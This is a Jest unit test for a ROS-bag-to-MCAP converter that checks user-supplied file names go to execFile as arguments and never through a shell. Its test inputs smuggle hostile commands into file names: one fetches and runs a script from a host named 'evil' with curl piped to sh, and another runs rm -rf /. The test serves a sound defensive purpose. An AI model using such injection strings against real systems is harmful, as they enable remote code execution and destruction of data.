import { exec, execFile } from 'node:child_process';
import { RosBagConverter } from '../src/file-processor/handlers/rosbag-converter';

jest.mock('node:child_process', () => ({
    exec: jest.fn(),
    execFile: jest.fn(
        (
            _file: string,
            _arguments: string[],
            callback: (
                error: Error | null,
                stdout: string,
                stderr: string,
            ) => void,
        ) => {
            callback(null, '', '');
        },
    ),
}));

// The queue consumer logger ships to Loki, keep it out of unit tests.
jest.mock('../src/logger', () => ({
    /* eslint-disable-next-line @typescript-eslint/naming-convention */
    __esModule: true,
    default: { warn: jest.fn(), error: jest.fn(), debug: jest.fn() },
}));

// Tracing starts an OTLP exporter on import, run the wrapped function as is.
jest.mock('../src/tracing', () => ({
    traceWrapper:
        <T>(run: () => Promise<T>) =>
        (): Promise<T> =>
            run(),
}));

describe('RosBagConverter', () => {
    it('passes user-controlled file names as arguments, not through a shell', async () => {
        // Drive file names end up in these paths unchanged.
        const input = '/tmp/job/x$(curl evil|sh).bag';
        const output = '/tmp/job/x"; rm -rf /; ".mcap';

        await RosBagConverter.convert(input, output);

        expect(exec).not.toHaveBeenCalled();
        expect(execFile).toHaveBeenCalledWith(
            'mcap',
            ['convert', input, output],
            expect.any(Function),
        );
    });
});
